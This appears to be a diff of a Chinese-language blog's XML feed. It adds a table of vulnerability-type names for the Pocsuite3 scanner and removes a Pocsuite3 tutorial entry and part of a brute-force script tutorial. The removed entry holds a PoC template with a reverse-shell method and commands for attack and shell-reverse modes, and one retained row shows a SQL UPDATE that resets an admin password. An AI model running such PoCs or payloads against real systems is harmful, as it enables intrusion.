+<tr>
+<td align="left">Null Byte Injection</td>
+<td align="left">空字节注入</td>
+<td align="left">null-byte-inj</td>
+</tr>
+<tr>
+<td align="left">CRLF Injection</td>
+<td align="left">CRLF注入</td>
+<td align="left">crlf-inj</td>
+</tr>
+<tr>
+<td align="left">SSI Injection</td>
+<td align="left">Ssi注入</td>
+<td align="left">ssi-inj</td>
+</tr>
+<tr>
+<td align="left">XPath Injection</td>
+<td align="left">Xpath注入</td>
+<td align="left">xpath-inj</td>
+</tr>
+<tr>
+<td align="left">XML Injection</td>
+<td align="left">Xml注入</td>
+<td align="left">xml-inj</td>
+</tr>
+<tr>
+<td align="left">XQuery Injection</td>
+<td align="left">Xquery 注入</td>
+<td align="left">xquery-inj</td>
+</tr>
+<tr>
+<td align="left">Command Execution</td>
+<td align="left">命令执行</td>
+<td align="left">cmd-exec</td>
+</tr>
+<tr>
+<td align="left">Code Execution</td>
+<td align="left">代码执行</td>
+<td align="left">code-exec</td>
+</tr>
+<tr>
+<td align="left">Remote File Inclusion</td>
+<td align="left">远程文件包含</td>
+<td align="left">rfi</td>
+</tr>
+<tr>
+<td align="left">Local File Inclusion</td>
+<td align="left">本地文件包含</td>
+<td align="left">lfi</td>
+</tr>
+<tr>
+<td align="left">Abuse of Functionality</td>
+<td align="left">功能函数滥用</td>
+<td align="left">func-abuse</td>
+</tr>
+<tr>
+<td align="left">Brute Force</td>
+<td align="left">暴力破解</td>
+<td align="left">brute-force</td>
+</tr>
+<tr>
+<td align="left">Buffer Overflow</td>
+<td align="left">缓冲区溢出</td>
+<td align="left">buffer-overflow</td>
+</tr>
+<tr>
+<td align="left">Content Spoofing</td>
+<td align="left">内容欺骗</td>
+<td align="left">spoofing</td>
+</tr>
+<tr>
+<td align="left">Credential Prediction</td>
+<td align="left">证书预测</td>
+<td align="left">credential-prediction</td>
+</tr>
+<tr>
+<td align="left">Session Prediction</td>
+<td align="left">会话预测</td>
+<td align="left">session-prediction</td>
+</tr>
+<tr>
+<td align="left">Denial of Service</td>
+<td align="left">拒绝服务</td>
+<td align="left">dos</td>
+</tr>
+<tr>
+<td align="left">Fingerprinting</td>
+<td align="left">指纹识别</td>
+<td align="left">finger</td>
+</tr>
+<tr>
+<td align="left">Format String</td>
+<td align="left">格式化字符串</td>
+<td align="left">format-string</td>
+</tr>
+<tr>
+<td align="left">HTTP Response Smuggling</td>
+<td align="left">http响应伪造</td>
+<td align="left">http-response-smuggling</td>
+</tr>
+<tr>
+<td align="left">HTTP Response Splitting</td>
+<td align="left">http响应拆分</td>
+<td align="left">http-response-splitting</td>
+</tr>
+<tr>
+<td align="left">HTTP Request Splitting</td>
+<td align="left">http请求拆分</td>
+<td align="left">http-request-splitting</td>
+</tr>
+<tr>
+<td align="left">HTTP Request Smuggling</td>
+<td align="left">http请求伪造</td>
+<td align="left">http-request-smuggling</td>
+</tr>
+<tr>
+<td align="left">HTTP Parameter Pollution</td>
+<td align="left">http参数污染</td>
+<td align="left">hpp</td>
+</tr>
+<tr>
+<td align="left">Integer Overflows</td>
+<td align="left">整数溢出</td>
+<td align="left">int-overflow</td>
+</tr>
+<tr>
+<td align="left">Predictable Resource Location</td>
+<td align="left">可预测资源定位</td>
+<td align="left">res-location</td>
+</tr>
+<tr>
+<td align="left">Session Fixation</td>
+<td align="left">会话固定</td>
+<td align="left">session-fixation</td>
+</tr>
+<tr>
+<td align="left">URL Redirector Abuse</td>
+<td align="left">url重定向</td>
+<td align="left">redirect</td>
+</tr>
+<tr>
+<td align="left">Privilege Escalation</td>
+<td align="left">权限提升</td>
+<td align="left">privilege-escalation</td>
+</tr>
+<tr>
+<td align="left">Resolve Error</td>
+<td align="left">解析错误</td>
+<td align="left">resolve-error</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Creation</td>
+<td align="left">任意文件创建</td>
+<td align="left">file-creation</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Download</td>
+<td align="left">任意文件下载</td>
+<td align="left">file-download</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Deletion</td>
+<td align="left">任意文件删除</td>
+<td align="left">file-deletion</td>
+</tr>
+<tr>
+<td align="left">Backup File Found</td>
+<td align="left">备份文件发现</td>
+<td align="left">bak-file-found</td>
+</tr>
+<tr>
+<td align="left">Database Found</td>
+<td align="left">数据库发现</td>
+<td align="left">db-found</td>
+</tr>
+<tr>
+<td align="left">Directory Listing</td>
+<td align="left">目录遍历</td>
+<td align="left">dir-listing</td>
+</tr>
+<tr>
+<td align="left">Directory Traversal</td>
+<td align="left">目录穿越</td>
+<td align="left">dir-traversal</td>
+</tr>
+<tr>
+<td align="left">File Upload</td>
+<td align="left">文件上传</td>
+<td align="left">file-upload</td>
+</tr>
+<tr>
+<td align="left">Login Bypass</td>
+<td align="left">登录绕过</td>
+<td align="left">login-bypass</td>
+</tr>
+<tr>
+<td align="left">Weak Password</td>
+<td align="left">弱密码</td>
+<td align="left">weak-pass</td>
+</tr>
+<tr>
+<td align="left">Remote Password Change</td>
+<td align="left">远程密码修改</td>
+<td align="left">remote-pass-change</td>
+</tr>
+<tr>
+<td align="left">Code Disclosure</td>
+<td align="left">代码泄漏</td>
+<td align="left">code-disclosure</td>
+</tr>
+<tr>
+<td align="left">Path Disclosure</td>
+<td align="left">路径泄漏</td>
+<td align="left">path-disclosure</td>
+</tr>
+<tr>
+<td align="left">Information Disclosure</td>
+<td align="left">信息泄漏</td>
+<td align="left">info-disclosure</td>
+</tr>
+<tr>
+<td align="left">Security Mode Bypass</td>
+<td align="left">安全模式绕过</td>
+<td align="left">sec-bypass</td>
+</tr>
+<tr>
+<td align="left">Malware</td>
+<td align="left">挂马</td>
+<td align="left">mal</td>
+</tr>
+<tr>
+<td align="left">Black Link</td>
+<td align="left">暗链</td>
+<td align="left">black-link</td>
+</tr>
+<tr>
+<td align="left">Backdoor</td>
+<td align="left">后门</td>
+<td align="left">backdoor</td>
+</tr>
+<tr>
+<td align="left">Unauthorized access</td>
+<td align="left">未授权访问</td>
+<td align="left">Unauthorized access</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Pocsuite</tag>
       </tags>
   </entry>
   <entry>
@@ -4238,7 +4601,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#x31;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a>](mailto:<a href="mailto:&#x31;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#64;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#49;&#64;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a>](mailto:<a href="mailto:&#x31;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -4292,406 +4655,6 @@
       </categories>
       <tags>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pocsuite3使用</title>
-    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>
-
-<p>（所有字母均为小写,所有的符号改成_）</p>
-<p>例：</p>
-<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>
-
-<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>
-
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>
-
-<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>
-
-<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">from pocsuite3.api import logger</td>
-<td align="left">日志记录，比如logger.log(info)</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import requests</td>
-<td align="left">请求类，用法同 requests</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import Seebug</td>
-<td align="left">Seebug api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import ZoomEye</td>
-<td align="left">ZoomEye api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import CEye</td>
-<td align="left">Ceye api 调用</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import crawl</td>
-<td align="left">简单爬虫功能</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import PHTTPServer</td>
-<td align="left">Http服务功能</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import REVERSE_PAYLOAD</td>
-<td align="left">反向连接shell payload</td>
-</tr>
-<tr>
-<td align="left">from pocsuite3.api import get_results</td>
-<td align="left">获取结果</td>
-</tr>
-</tbody></table>
-<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
-<thead>
-<tr>
-<th align="left">英文名称</th>
-<th align="left">中文名称</th>
-<th align="left">缩写</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Cross Site Scripting</td>
-<td align="left">跨站脚本</td>
-<td align="left">xss</td>
-</tr>
-<tr>
-<td align="left">Cross Site Request Forgery</td>
-<td align="left">跨站请求伪造</td>
-<td align="left">csrf</td>
-</tr>
-<tr>
-<td align="left">SQL Injection</td>
-<td align="left">Sql注入</td>
-<td align="left">sql-inj</td>
-</tr>
-<tr>
-<td align="left">LDAP Injection</td>
-<td align="left">ldap注入</td>
-<td align="left">ldap-inj</td>
-</tr>
-<tr>
-<td align="left">Mail Command Injection</td>
-<td align="left">邮件命令注入</td>
-<td align="left">smtp-inj</td>
-</tr>
-<tr>
-<td align="left">Null Byte Injection</td>
-<td align="left">空字节注入</td>
-<td align="left">null-byte-inj</td>
-</tr>
-<tr>
-<td align="left">CRLF Injection</td>
-<td align="left">CRLF注入</td>
-<td align="left">crlf-inj</td>
-</tr>
-<tr>
-<td align="left">SSI Injection</td>
-<td align="left">Ssi注入</td>
-<td align="left">ssi-inj</td>
-</tr>
-<tr>
-<td align="left">XPath Injection</td>
-<td align="left">Xpath注入</td>
-<td align="left">xpath-inj</td>
-</tr>
-<tr>
-<td align="left">XML Injection</td>
-<td align="left">Xml注入</td>
-<td align="left">xml-inj</td>
-</tr>
-<tr>
-<td align="left">XQuery Injection</td>
-<td align="left">Xquery 注入</td>
-<td align="left">xquery-inj</td>
-</tr>
-<tr>
-<td align="left">Command Execution</td>
-<td align="left">命令执行</td>
-<td align="left">cmd-exec</td>
-</tr>
-<tr>
-<td align="left">Code Execution</td>
-<td align="left">代码执行</td>
-<td align="left">code-exec</td>
-</tr>
-<tr>
-<td align="left">Remote File Inclusion</td>
-<td align="left">远程文件包含</td>
-<td align="left">rfi</td>
-</tr>
-<tr>
-<td align="left">Local File Inclusion</td>
-<td align="left">本地文件包含</td>
-<td align="left">lfi</td>
-</tr>
-<tr>
-<td align="left">Abuse of Functionality</td>
-<td align="left">功能函数滥用</td>
-<td align="left">func-abuse</td>
-</tr>
-<tr>
-<td align="left">Brute Force</td>
-<td align="left">暴力破解</td>
-<td align="left">brute-force</td>
-</tr>
-<tr>
-<td align="left">Buffer Overflow</td>
-<td align="left">缓冲区溢出</td>
-<td align="left">buffer-overflow</td>
-</tr>
-<tr>
-<td align="left">Content Spoofing</td>
-<td align="left">内容欺骗</td>
-<td align="left">spoofing</td>
-</tr>
-<tr>
-<td align="left">Credential Prediction</td>
-<td align="left">证书预测</td>
-<td align="left">credential-prediction</td>
-</tr>
-<tr>
-<td align="left">Session Prediction</td>
-<td align="left">会话预测</td>
-<td align="left">session-prediction</td>
-</tr>
-<tr>
-<td align="left">Denial of Service</td>
-<td align="left">拒绝服务</td>
-<td align="left">dos</td>
-</tr>
-<tr>
-<td align="left">Fingerprinting</td>
-<td align="left">指纹识别</td>
-<td align="left">finger</td>
-</tr>
-<tr>
-<td align="left">Format String</td>
-<td align="left">格式化字符串</td>
-<td align="left">format-string</td>
-</tr>
-<tr>
-<td align="left">HTTP Response Smuggling</td>
-<td align="left">http响应伪造</td>
-<td align="left">http-response-smuggling</td>
-</tr>
-<tr>
-<td align="left">HTTP Response Splitting</td>
-<td align="left">http响应拆分</td>
-<td align="left">http-response-splitting</td>
-</tr>
-<tr>
-<td align="left">HTTP Request Splitting</td>
-<td align="left">http请求拆分</td>
-<td align="left">http-request-splitting</td>
-</tr>
-<tr>
-<td align="left">HTTP Request Smuggling</td>
-<td align="left">http请求伪造</td>
-<td align="left">http-request-smuggling</td>
-</tr>
-<tr>
-<td align="left">HTTP Parameter Pollution</td>
-<td align="left">http参数污染</td>
-<td align="left">hpp</td>
-</tr>
-<tr>
-<td align="left">Integer Overflows</td>
-<td align="left">整数溢出</td>
-<td align="left">int-overflow</td>
-</tr>
-<tr>
-<td align="left">Predictable Resource Location</td>
-<td align="left">可预测资源定位</td>
-<td align="left">res-location</td>
-</tr>
-<tr>
-<td align="left">Session Fixation</td>
-<td align="left">会话固定</td>
-<td align="left">session-fixation</td>
-</tr>
-<tr>
-<td align="left">URL Redirector Abuse</td>
-<td align="left">url重定向</td>
-<td align="left">redirect</td>
-</tr>
-<tr>
-<td align="left">Privilege Escalation</td>
-<td align="left">权限提升</td>
-<td align="left">privilege-escalation</td>
-</tr>
-<tr>
-<td align="left">Resolve Error</td>
-<td align="left">解析错误</td>
-<td align="left">resolve-error</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Creation</td>
-<td align="left">任意文件创建</td>
-<td align="left">file-creation</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Download</td>
-<td align="left">任意文件下载</td>
-<td align="left">file-download</td>
-</tr>
-<tr>
-<td align="left">Arbitrary File Deletion</td>
-<td align="left">任意文件删除</td>
-<td align="left">file-deletion</td>
-</tr>
-<tr>
-<td align="left">Backup File Found</td>
-<td align="left">备份文件发现</td>
-<td align="left">bak-file-found</td>
-</tr>
-<tr>
-<td align="left">Database Found</td>
-<td align="left">数据库发现</td>
-<td align="left">db-found</td>
-</tr>
-<tr>
-<td align="left">Directory Listing</td>
-<td align="left">目录遍历</td>
-<td align="left">dir-listing</td>
-</tr>
-<tr>
-<td align="left">Directory Traversal</td>
-<td align="left">目录穿越</td>
-<td align="left">dir-traversal</td>
-</tr>
-<tr>
-<td align="left">File Upload</td>
-<td align="left">文件上传</td>
-<td align="left">file-upload</td>
-</tr>
-<tr>
-<td align="left">Login Bypass</td>
-<td align="left">登录绕过</td>
-<td align="left">login-bypass</td>
-</tr>
-<tr>
-<td align="left">Weak Password</td>
-<td align="left">弱密码</td>
-<td align="left">weak-pass</td>
-</tr>
-<tr>
-<td align="left">Remote Password Change</td>
-<td align="left">远程密码修改</td>
-<td align="left">remote-pass-change</td>
-</tr>
-<tr>
-<td align="left">Code Disclosure</td>
-<td align="left">代码泄漏</td>
-<td align="left">code-disclosure</td>
-</tr>
-<tr>
-<td align="left">Path Disclosure</td>
-<td align="left">路径泄漏</td>
-<td align="left">path-disclosure</td>
-</tr>
-<tr>
-<td align="left">Information Disclosure</td>
-<td align="left">信息泄漏</td>
-<td align="left">info-disclosure</td>
-</tr>
-<tr>
-<td align="left">Security Mode Bypass</td>
-<td align="left">安全模式绕过</td>
-<td align="left">sec-bypass</td>
-</tr>
-<tr>
-<td align="left">Malware</td>
-<td align="left">挂马</td>
-<td align="left">mal</td>
-</tr>
-<tr>
-<td align="left">Black Link</td>
-<td align="left">暗链</td>
-<td align="left">black-link</td>
-</tr>
-<tr>
-<td align="left">Backdoor</td>
-<td align="left">后门</td>
-<td align="left">backdoor</td>
-</tr>
-<tr>
-<td align="left">Unauthorized access</td>
-<td align="left">未授权访问</td>
-<td align="left">Unauthorized access</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Pocsuite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python之爆破脚本</title>
-    <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
-<h1 id="二、模块介绍"><a href="#二、模块介绍" class="headerlink" title="二、模块介绍"></a>二、模块介绍</h1><p><strong>参数模块</strong></p>
-<p>getopt函数</p>
-<pre class="highlight"><span class="line">import sys, getopt</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">   inputfile = &#x27;&#x27;</span><br><span class="line">   outputfile = &#x27;&#x27;</span><br><span class="line">   try:</span><br><span class="line">      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])</span><br><span class="line">   except getopt.GetoptError:</span><br><span class="line">      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">      sys.exit(2)</span><br><span class="line">   for opt, arg in opts:</span><br><span class="line">      if opt == &#x27;-h&#x27;:</span><br><span class="line">         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)</span><br><span class="line">         sys.exit()</span><br><span class="line">      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):</span><br><span class="line">         inputfile = arg</span><br><span class="line">      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):</span><br><span class="line">         outputfile = arg</span><br><span class="line">   print (&#x27;输入的文件为：&#x27;, inputfile)</span><br><span class="line">   print (&#x27;输出的文件为：&#x27;, outputfile)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   main(sys.argv[1:])</span><br><span class="line"></span><br></pre>
-
-<p>说明：</p>
-<table>
-<thead>
-<tr>
-<th>语句</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>argv[1:]</td>
-<td>不限制参数数量（&gt;1）</td>
-</tr>
-<tr>
-<td>try:  <br>&#9;pass  <br>except  getopt.GetoptError:  <br>&#9;pass</td>
-<td>异常捕捉，参数不存在时报错，提示正确的用法</td>
-</tr>
-<tr>
-<td>opts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])</td>
-<td>定义短标签（-）和长标签（–）  <br>短标签:表示必须有此参数，长标签=同理  <br><br>注意！经实验得知，<code>:、=</code>号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加<code>:、=</code></td>
-</tr>
-<tr>
-<td>for opt, arg in opts:     <br>&#9;if opt == ‘-h’:       <br>&#9;&#9;print (<code>&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;</code>)       <br>&#9;&#9;sys.exit()     <br>&#9;elif opt in (“-i”,  “–ifile”):       <br>&#9;&#9;inputfile = arg</td>
-<td>for循环判断匹配参数  ，opt为参数，arg为参数值</td>
-</tr>
-</tbody></table>
-<p><strong>进度条模块</strong></p>
-<p>rich</p>
-<pre class="highlight"><span class="line">from rich.progress import Progress		# 模块导入</span><br><span class="line"></span><br><span class="line">with Progress() as progress:			# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数</span><br><span class="line">        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)   </span><br><span class="line"> </span><br><span class="line">while not progress.finished:			# 任务函数用使用，更新进度条，advance每次更新的长度</span><br><span class="line">        progress.update(task, advance=5)</span><br><span class="line"></span><br></pre>
-
-
-
-<p>三、代码</p>
